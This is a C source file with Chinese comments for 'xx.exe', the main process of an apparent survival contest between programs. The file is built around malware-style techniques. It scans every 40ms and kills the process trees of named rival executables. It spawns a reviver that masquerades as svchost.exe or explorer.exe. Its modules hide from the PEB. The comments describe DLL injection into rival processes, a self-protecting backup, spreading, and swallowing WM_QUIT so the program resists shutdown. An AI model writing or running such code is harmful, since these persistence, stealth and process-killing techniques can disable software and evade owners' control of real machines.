/*
 * xx.c - 主进程（集成 DeamonInit、guard.dll 加载，修复路径写入）
 * 编译器：GNU GCC (MinGW-w64)
 * 编译选项：gcc -s -O2 -Wall -static -o "%OUTDIR%\xx.exe" xx\xx.c ^
    -lole32 -loleaut32 -lwbemuuid -ladvapi32 -lpsapi -lshell32
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_DCOM

#include <windows.h>
#include <accctrl.h>
#include <aclapi.h>
#include <sddl.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <time.h>
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <wbemidl.h>


/* 共享内存布局与命名常量：唯一来源见 xxipc.h */
#include "xxipc.h"

/* Fix for MinGW missing CIM_FLAG_ANY */
#ifndef CIM_FLAG_ANY
#define CIM_FLAG_ANY 0
#endif

/* 全局变量 */
HANDLE g_hSharedMem = NULL;
PVOID  g_pSharedView = NULL;
WCHAR  g_szHeartbeatSuffix[64];
HANDLE g_hHeartbeatEvent = NULL;
HANDLE g_hSelfHandle = NULL;   /* 收紧 DACL 之前拿到的自身进程句柄（交给 guard） */
DWORD  g_dwOwnSession = 0;     /* 收紧 DACL 之前取到的会话号（之后取会失败） */
CRITICAL_SECTION g_csLog;
BOOL   g_bFreshMapping = FALSE;   /* 本次是否新建了共享内存映射（决定 salt 沿用/新生成） */
static ULONGLONG g_dwNameToken = 0;   /* 64 位会话随机名 token：不写共享内存，只用 XxSetNames 推给各模块 */
#define XX_WASTE_MS 200         /* 模仿 waste.c 的节奏：每 0.2 秒一条（10 条约 2 秒发完） */

/* 64 位密码学随机：RtlGenRandom（advapi32 的 SystemFunction036，Win7 自带）。
   失败才退回 rand()（有它就别用 rand：rand 的种子只含 tick+pid，可被时间窗爆破）。 */
typedef BOOLEAN (NTAPI *RtlGenRandom_t)(PVOID, ULONG);

static BOOL GenRandom64(ULONGLONG *pOut)
{
    static RtlGenRandom_t s_pFn = NULL;
    static BOOL s_bTried = FALSE;

    if (!pOut) return FALSE;
    if (!s_bTried) {
        HMODULE h = GetModuleHandleW(L"advapi32.dll");
        s_bTried = TRUE;
        if (!h) h = LoadLibraryW(L"advapi32.dll");
        if (h) s_pFn = (RtlGenRandom_t)GetProcAddress(h, "SystemFunction036");
    }
    if (!s_pFn) return FALSE;
    return s_pFn(pOut, (ULONG)sizeof(*pOut)) ? TRUE : FALSE;
}

/* 生成 64 位随机 token 并置最低位（保证非 0：0 是"没有 token"的哨兵值） */
static ULONGLONG MakeNameToken(void)
{
    ULONGLONG t = 0;
    if (!GenRandom64(&t)) {
        srand(GetTickCount() * 2654435761u + GetCurrentProcessId() * 7u);
        t = ((ULONGLONG)(DWORD)rand() << 32) ^ ((ULONGLONG)(DWORD)rand() << 16) ^ (DWORD)rand();
    }
    return t | 1ULL;
}

/* 命名对象用的 token：优先 RtlGenRandom 生成的 64 位值；退回共享内存的 64 位回退 token；再退回固定值 */
static ULONGLONG NameTok(void)
{
    if (g_dwNameToken) return g_dwNameToken;
    if (g_pSharedView) {
        ULONGLONG s = XX_NAME_TOKEN64(g_pSharedView);
        if (s) return s;
    }
    return XX_NAME_TOKEN_FIXED;
}

static void WriteLog(const WCHAR *format, ...);   /* 复活器代码里要用 */

/* ================== 加载我们自己的模块（绝对路径 + **版本校验**） ==================
   历史问题：机器上同时躺着旧版 dll 时，`LoadLibraryW` 可能"成功"返回一个**旧模块**，
   于是 GetProcAddress("DeamonInit"/"StartDefense"/"StartAttack") 全失败，日志却显示新路径
   —— 看起来像"新 dll 没有导出"，实际装进去的是旧文件。
   现在每个模块都导出 XxBuildTag()（当前 "v7"），加载后必须校验；不匹配就换下一个候选
   （不卸载：模块已映射，卸载更危险）。也不再用相对名兜底 —— 那会命中当前目录/System32 的旧文件。 */
#define XX_MOD_TAG_A "v7"

static HMODULE TryLoadVerified(const WCHAR *cand, WCHAR *outPath, SIZE_T cchOut,
                               HMODULE *phUnverified, WCHAR *badPath, SIZE_T cchBad)
{
    HMODULE h;
    WCHAR real[MAX_PATH] = L"";
    typedef const char * (WINAPI *Tag_t)(void);
    Tag_t pTag;

    if (!cand || !cand[0]) return NULL;
    h = LoadLibraryW(cand);
    if (!h) return NULL;

    /* 注意：模块的 DllMain 会调用 XXHideSelfFromPeb() 把自己从 PEB 三条链里摘掉，
       之后再 GetModuleFileNameW(该模块) 会失败（→ 日志里的"实际=(未知)"）。
       摘链之前拿不到路径就用请求路径，日志更好读。 */
    if (!GetModuleFileNameW(h, real, MAX_PATH)) real[0] = L'\0';
    pTag = (Tag_t)XXGetProcByName(h, "XxBuildTag");   /* 摘链后 GetProcAddress 会失败，必须自己解析导出表 */
    if (!pTag || strcmp(pTag(), XX_MOD_TAG_A) != 0) {
        WriteLog(L"!! 版本不匹配: 请求=%ls 实际=%ls 标记=%ls -> 先记下，继续找合格候选",
                 cand, real[0] ? real : cand, pTag ? L"有(不同版本)" : L"无(过度古老的 dll)");
        if (phUnverified && !*phUnverified) {                 /* 第一个不合格的留作兜底 */
            *phUnverified = h;
            if (badPath && cchBad) wcsncpy_s(badPath, cchBad, real[0] ? real : cand, _TRUNCATE);
        }
        return NULL;
    }
    if (outPath) wcsncpy_s(outPath, cchOut, real[0] ? real : cand, _TRUNCATE);
    return h;
}

static HMODULE LoadOurModuleEx(const WCHAR *leaf, WCHAR *outPath, SIZE_T cchOut)
{
    WCHAR self[MAX_PATH], dir[MAX_PATH], cand[MAX_PATH], tmp[MAX_PATH];
    HMODULE hUnverified = NULL;
    WCHAR badPath[MAX_PATH] = L"";
    DWORD salt;

    if (outPath && cchOut) outPath[0] = L'\0';
    if (!leaf || !leaf[0]) return NULL;
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);

    /* 1) 自身目录 */
    if (GetModuleFileNameW(NULL, self, MAX_PATH)) {
        WCHAR *s = wcsrchr(self, L'\\');
        if (s) {
            s[1] = L'\0';
            swprintf_s(cand, MAX_PATH, L"%ls%ls", self, leaf);
            if (GetFileAttributesW(cand) != INVALID_FILE_ATTRIBUTES) {
                HMODULE h = TryLoadVerified(cand, outPath, cchOut, &hUnverified, badPath, MAX_PATH);
                if (h) return h;
            }
        }
    }
    /* 2) 共享内存里记的程序目录（副本在 %TEMP% 跑时真身 dll 在原目录） */
    salt = g_pSharedView ? XX_TMP_SALT(g_pSharedView) : 0;
    if (g_pSharedView) {
        XXDirNameOf(XX_XXPATH(g_pSharedView), dir, MAX_PATH);
        if (dir[0]) {
            swprintf_s(cand, MAX_PATH, L"%ls%ls", dir, leaf);
            if (GetFileAttributesW(cand) != INVALID_FILE_ATTRIBUTES) {
                HMODULE h = TryLoadVerified(cand, outPath, cchOut, &hUnverified, badPath, MAX_PATH);
                if (h) return h;
            }
            if (salt && XXMakeTempCopy(cand, salt, tmp, MAX_PATH)) {
                HMODULE h = TryLoadVerified(tmp, outPath, cchOut, &hUnverified, badPath, MAX_PATH);
                if (h) return h;
            }
        }
    }
    /* 没有合格版本：**兜底用旧版**，而不是干脆不加载 —— "少一个功能"比"整个模块没有"好
       （defense/svcguard 缺了就完全失去防御/扩散）。日志会明确告诉用户该换哪个文件。 */
    if (hUnverified) {
        WriteLog(L"!! %ls 没有合格版本（本版应为 %hs），兜底使用旧版: %ls -> 请替换该文件",
                 leaf, XX_MOD_TAG_A, badPath[0] ? badPath : L"(未知)");
        if (outPath) wcsncpy_s(outPath, cchOut, badPath[0] ? badPath : leaf, _TRUNCATE);
        return hUnverified;
    }
    WriteLog(L"!! 找不到 %ls（自身目录与程序目录里都没有这个文件）", leaf);
    return NULL;
}
/* ================== 复活器（reviver）：**只负责复活 xx**，不接管 ==================
   设计变更（用户要求）：
     · 运行期不再"让副本接管全部工作"，而是留一个**只做复活**的小进程；
     · 它靠命令行拿到上一轮的 **64 位会话 token** 和本体的完整路径：
           xx.exe --revive <bossPid> --exe "<xx.exe 全路径>" --token <16 位十六进制>
       本体一死（或心跳停摆）它就把 xx.exe 重新拉起来，并**把同一个 token 传回去**，
       这样复活出来的实例沿用同一套命名对象/共享内存后缀，等于"接着上一轮继续干活"。
     · 极端情况（没有 token、没有 exe 路径、拉起失败）：直接跑一个**全新的 xx**（不带 token，
       由它自己生成新 token、按新会话重新开始）。
   复活器拉起新实例后自己退出 —— 新实例会再布置一个自己的复活器，链条不会断，也不会出现
   两份同时干活的本体。 */
static const WCHAR *g_reviverNames[] = { L"svchost.exe", L"explorer.exe", L"conhost.exe" };
static BOOL  g_bReviveMode = FALSE;      /* 本进程是复活器 */
static DWORD g_dwRevivePid = 0;          /* 要监视的本体 PID */
static WCHAR g_szReviveExe[MAX_PATH] = L"";  /* 本体完整路径 */
static ULONGLONG g_dwInheritedToken = 0; /* 从命令行继承的会话 token（0 = 没有） */

#include "parts/service.c"

#include "parts/reviver.c"

static void WriteLog(const WCHAR *format, ...);

/* 把会话随机名推给本进程内加载的模块（同进程直接调用导出函数，不需要远程那套） */
static void PushNamesToModule(HMODULE hMod)
{
    typedef BOOL (WINAPI *SetNames_t)(const XX_NAME_BLOCK *);
    SetNames_t pSet;
    XX_NAME_BLOCK blk;

    if (!hMod) return;
    pSet = (SetNames_t)XXGetProcByName(hMod, "XxSetNames");
    if (!pSet) return;
    XXNameBlockInit(&blk, NameTok(), g_dwOwnSession);
    if (!pSet(&blk)) WriteLog(L"XxSetNames 被拒绝");
}

/* 前置声明 */
static BOOL InitSecurityDescriptor(void);
static BOOL InitSharedMemory(void);
static BOOL CreateHeartbeatSuffix(void);
static BOOL SetupWMISubscription(void);
static DWORD WINAPI InitThread(LPVOID lpParam);
static DWORD WINAPI AttackThread(LPVOID lpParam);
static BOOL GetProcessPathByPid(DWORD pid, WCHAR *path, DWORD cch);

void RegisterSelfToXpt(void);

/* 说明：原来这里有一段**在 main 之前跑的 TLS 回调**（"开局先杀一遍"：对 yy 窗口
   PostMessage 最小化/关闭/DestroyWindow）。它有两个问题：
     ① loader lock 下执行、还会碰临界区，卡住时后续线程全部排队 —— 现象是
        "进程活着、只有主线程能打日志、window.dll 永远不加载、没有弹窗"；
     ② 它做的正是**改标题/隐藏/关闭窗口**这类花招，实测收益很小。
   现在开局击杀改由两条攻击线程负责（窗口枚举 + 进程名扫描），这里整段删除。 */
/* ================== 安全描述符 ================== */
#include "parts/init.c"

static BOOL __attribute__((unused)) GetProcessPathByPid(DWORD pid, WCHAR *path, DWORD cch)
{
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    DWORD n = cch;
    BOOL ok = FALSE;
    if (h) {
        ok = QueryFullProcessImageNameW(h, 0, path, &n) ? TRUE : FALSE;
        CloseHandle(h);
    }
    if (!ok && cch) path[0] = L'\0';
    return ok;
}
static BOOL IsOurPopupClass(const WCHAR *cls)
{
    int i;
    if (!cls) return FALSE;
    if (wcsncmp(cls, L"wnd_", 4) != 0) return FALSE;
    if (wcslen(cls) != 20) return FALSE;
    for (i = 4; i < 20; i++) {
        WCHAR c = cls[i];
        if (!((c >= L'0' && c <= L'9') || (c >= L'a' && c <= L'f'))) return FALSE;
    }
    return TRUE;
}

static BOOL IsOurOwnPopupWindow(HWND hWnd, const WCHAR *cls)
{
    HANDLE hMap;
    PVOID view;
    int i;

    if (IsOurPopupClass(cls)) return TRUE;

    hMap = XXOpenShared();
    if (!hMap) return FALSE;
    view = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE);
    if (!view) { CloseHandle(hMap); return FALSE; }
    for (i = 0; i < OWNER_SLOTS; i++) {
        if ((HWND)(ULONG_PTR)XX_SLOT_HWND(view, i) == hWnd) {
            UnmapViewOfFile(view);
            CloseHandle(hMap);
            return TRUE;
        }
    }
    UnmapViewOfFile(view);
    CloseHandle(hMap);
    return FALSE;
}

/* ================== 攻击线程：窗口只用来"发现"，杀由 atkcore 统一做 ================== */
typedef void (WINAPI *XxKillTree_t)(DWORD pid);
static XxKillTree_t g_pfnKillTree = NULL;

/* 懒加载 atkcore 的 XxKillTree（按名扫描线程可能先于 AttackThread 跑起来） */
static XxKillTree_t EnsureKillTreeFn(void)
{
    if (!g_pfnKillTree) {
        HMODULE h = GetModuleHandleW(L"atkcore.dll");
        if (!h) {
            WCHAR p[MAX_PATH] = L"";
            h = LoadOurModuleEx(L"atkcore.dll", p, MAX_PATH);
            PushNamesToModule(h);
        }
        if (h) g_pfnKillTree = (XxKillTree_t)XXGetProcByName(h, "XxKillTree");
    }
    return g_pfnKillTree;
}

/* ================== 攻击线程 #2：**按进程名**扫描（与窗口扫描并行） ==================
   用户要求两条线分开跑：
     · AttackThread     —— 枚举窗口找 yy（能抓到"改了名但窗口特征还在"的副本）；
     · ProcScanThread   —— 直接扫进程表按名字找（yy.exe / ww.exe / lenovo_fix.exe），
                           不依赖窗口（无窗口/无桌面的副本也能杀）。
   两条线都走同一个 atkcore 出口（XxKillTree → 快杀 + 后台清理），互不干扰；
   频率 40ms（<50ms），发现即杀。 */
static DWORD WINAPI ProcScanThread(LPVOID lpParam)
{
    static const WCHAR *targets[] = { L"yy.exe", L"ww.exe", L"lenovo_fix.exe", NULL };
    UNREFERENCED_PARAMETER(lpParam);
    WriteLog(L"进程名扫描线程启动（yy.exe / ww.exe / lenovo_fix.exe，40ms 一轮）");

    for (;;) {
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(pe) };
            DWORD self = GetCurrentProcessId();
            if (Process32FirstW(hSnap, &pe)) {
                do {
                    int i;
                    if (pe.th32ProcessID <= 4 || pe.th32ProcessID == self) continue;
                    for (i = 0; targets[i]; i++) {
                        if (_wcsicmp(pe.szExeFile, targets[i]) != 0) continue;
                        WriteLog(L"进程名命中 %ls PID=%lu -> 结束整棵进程树",
                                 pe.szExeFile, pe.th32ProcessID);
                        if (EnsureKillTreeFn()) g_pfnKillTree(pe.th32ProcessID);
                        else {
                            HANDLE hk = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                            if (hk) { TerminateProcess(hk, 0); CloseHandle(hk); }
                        }
                        break;
                    }
                } while (Process32NextW(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }
        Sleep(40);       /* <50ms */
    }
    return 0;
}

static DWORD WINAPI AttackThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);
    WriteLog(L"Attack thread starting...");

    WCHAR ownSuffix[MAX_WND_SUFFIX] = { 0 };
    HANDLE hMap = OpenFileMappingW(FILE_MAP_READ, FALSE, SHARED_MEM_NAME);
    if (hMap) {
        void *pView = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE);
        if (pView) {
            WCHAR *pSuffix = (WCHAR *)((BYTE *)pView + OFFSET_WND_SUFFIX);
            wcsncpy_s(ownSuffix, MAX_WND_SUFFIX, pSuffix, _TRUNCATE);
            UnmapViewOfFile(pView);
        }
        CloseHandle(hMap);
    }

    WCHAR killPath[MAX_PATH] = L"";
    HMODULE hKill = LoadOurModuleEx(L"atkcore.dll", killPath, MAX_PATH);
    WriteLog(L"atkcore.dll 路径: %ls", killPath[0] ? killPath : L"(未加载)");
    PushNamesToModule(hKill);
    if (hKill) {
        typedef void (WINAPI *StartAttack_t)(void);
        StartAttack_t pStart = (StartAttack_t)XXGetProcByName(hKill, "StartAttack");
        if (pStart) {
            pStart();
            WriteLog(L"atkcore.dll StartAttack called");
        }
        g_pfnKillTree = (XxKillTree_t)XXGetProcByName(hKill, "XxKillTree");
        if (!g_pfnKillTree) WriteLog(L"!! atkcore XxKillTree 导出缺失（旧 dll）-> 窗口命中时只能单进程 Terminate");
    }

    WriteLog(L"窗口扫描线程启动（窗口只用于发现，杀由 atkcore 的 XxKillTree 统一做）");

    while (1) {
        HWND hWnd = GetTopWindow(NULL);
        while (hWnd) {
            if (!IsWindow(hWnd)) { hWnd = GetNextWindow(hWnd, GW_HWNDNEXT); continue; }
            if (!IsWindowVisible(hWnd)) { hWnd = GetNextWindow(hWnd, GW_HWNDNEXT); continue; }

            WCHAR cls[128] = { 0 };
            GetClassNameW(hWnd, cls, _countof(cls));

            DWORD pid = 0;
            GetWindowThreadProcessId(hWnd, &pid);
            if (pid == 0) { hWnd = GetNextWindow(hWnd, GW_HWNDNEXT); continue; }

            /* 别打自己人的窗口。**不能**用"该进程里有我们的 window 模块"判断：
               我们会把 window.dll 注入进 yy 的子进程（蜜罐 lenovo_fix.exe），
               那样它的窗口会被误判成我方窗口直接跳过 —— 实测它的标题一直没人动就是这么来的。
               改成：类名符合我方格式 `wnd_<16hex>`，或这个句柄正登记在弹窗持有者表里。 */
            if (pid == GetCurrentProcessId() || IsOurOwnPopupWindow(hWnd, cls)) {
                hWnd = GetNextWindow(hWnd, GW_HWNDNEXT);
                continue;
            }

            BOOL bTarget = FALSE, bYyWin = FALSE;
            HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
            if (hProc) {
                WCHAR path[MAX_PATH];
                DWORD size = MAX_PATH;
                if (QueryFullProcessImageNameW(hProc, 0, path, &size)) {
                    WCHAR *pName = wcsrchr(path, L'\\');
                    if (pName) pName++; else pName = path;
                    if (_wcsicmp(pName, L"yy.exe") == 0 || _wcsicmp(pName, L"ww.exe") == 0)
                        bTarget = TRUE;
                }
                CloseHandle(hProc);
            }
            if (!bTarget) {
                /* 正判据：yy 的窗口特征（改名过的副本也带这些特征） */
                WCHAR wtitle[256] = L"";
                GetWindowTextW(hWnd, wtitle, _countof(wtitle));
                if (wcsstr(cls, L"YYWnd") || wcscmp(wtitle, L"YY_Defensive_GUI") == 0)
                    bYyWin = TRUE;
            }
            WCHAR enemyCls[128], enemyTitle[256];
            wcscpy_s(enemyCls, _countof(enemyCls), cls);
            GetWindowTextW(hWnd, enemyTitle, _countof(enemyTitle));

            /* 新规则：
               **本体（yy.exe/ww.exe）只嘲讽、不压制** —— atkcore 的 waste 模仿线程要往它的
               日志框里连发 10 条嘲讽，一旦我们隐藏/挂到不可见父窗口/最小化，嘲讽就没人看得见；
               10 条发完后由 atkcore 结束它的进程树并锁死删除源文件。
               **子进程（蜜罐 lenovo_fix.exe 等）**照常压制（改标题/隐藏/挂父窗口/最小化），
               因为它们接下来会被直接杀掉+锁死+删除，死之前也别让它发出存活证明。 */
            /* 只做"窗口 → PID → 结束整棵进程树"。
               改标题 / 隐藏 / 挂不可见父窗口 / 最小化 / 建假窗口 全部删掉：
               那些跨进程窗口操作既费时又几乎没有实际收益（用户实测）。 */
            if (bTarget || bYyWin) {
                WriteLog(L"窗口命中 PID=%lu cls=%ls -> 结束整棵进程树", pid, cls);
                if (g_pfnKillTree) g_pfnKillTree(pid);
                else {
                    HANDLE hk = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                    if (hk) { TerminateProcess(hk, 0); CloseHandle(hk); }
                }
            }

            hWnd = GetNextWindow(hWnd, GW_HWNDNEXT);
        }
        /* 降低 xx.exe 自身窗口扫描频率：攻击负荷在被注入的副本里，这里 300ms 足够 */
        Sleep(40);      /* 攻击频率 <50ms */
    }
    return 0;
}
/* ================== 主入口 ================== */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    UNREFERENCED_PARAMETER(nCmdShow);


    InitializeCriticalSection(&g_csLog);
    WriteLog(L"==== xx.exe 启动 build=v11 (verified-load / async-tree-kill / reviver) ====");
    if (SvcHandleCommandLine()) return 0;   /* 服务模式：安装/运行/卸载都在里面处理完 */
    ParseReviveArgs();
    if (g_bReviveMode) RunReviver();     /* 复活器：只复活 xx，不接管；函数内 ExitProcess */

    /* Step 1: start attack immediately */
    /* 两条攻击线程并行：
       ① ProcScanThread：按进程名找 yy.exe / ww.exe / lenovo_fix.exe（不依赖窗口）
       ② AttackThread  ：枚举窗口找 yy（能抓"改了名但窗口特征还在"的副本） */
    HANDLE hProcScanThread = CreateThread(NULL, 0, ProcScanThread, NULL, 0, NULL);
    if (hProcScanThread) {
        CloseHandle(hProcScanThread);
        WriteLog(L"ProcScan thread started（按进程名扫描 40ms）");
    }
    HANDLE hAttackThread = CreateThread(NULL, 0, AttackThread, NULL, 0, NULL);
    if (hAttackThread) {
        CloseHandle(hAttackThread);
        WriteLog(L"Attack thread started first");
    }

    /* Step 2: **初始化内联执行**（不再交给工作线程）：
       工作线程一旦被挂起/卡住，window.dll 就永远加载不上 —— 表现就是
       "进程活着、只有主线程能打日志、屏幕上没有弹窗"。 */
    WriteLog(L"Init: begin");
    InitThread(NULL);
    WriteLog(L"Init: done");

    /* Step 3: self-protection (maintain xx.exe backup) */
    HANDLE hSelfThread = CreateThread(NULL, 0, SelfProtectThread, NULL, 0, NULL);
    if (hSelfThread) {
        CloseHandle(hSelfThread);
        WriteLog(L"Self-protect thread started");
    }

    WriteLog(L"Entering message loop");

    /* message loop + periodic alive log */
    DWORD dwLastTick = GetTickCount();
    MSG msg;

    while (1) {
        // 处理消息
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            /* 外部 PostThreadMessage(WM_QUIT) 会让 PeekMessage 直接返回 WM_QUIT，
               一条消息就能让 xx 退出并触发复活/共享内存连锁，故直接吞掉
               （与 window.dll 消息循环同一策略）。 */
            if (msg.message == WM_QUIT) {
                WriteLog(L"ignored external WM_QUIT");
                continue;
            }
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }


        // 定期写入存活日志
        if (GetTickCount() - dwLastTick > 5000) {
            WriteLog(L"XX alive, PID: %lu", GetCurrentProcessId());
            dwLastTick = GetTickCount();
        }
        Sleep(1000);
    }

    /* 循环不会自行退出：xx.exe 只能被外部结束（这是存活竞赛的要求）。
       以下收尾代码保留，仅在被编译器优化掉的极端路径下才可能到达。 */
    DeleteCriticalSection(&g_csLog);
    if (g_pSharedView) UnmapViewOfFile(g_pSharedView);
    if (g_hSharedMem) CloseHandle(g_hSharedMem);
    if (g_hHeartbeatEvent) CloseHandle(g_hHeartbeatEvent);
    return 0;
}

































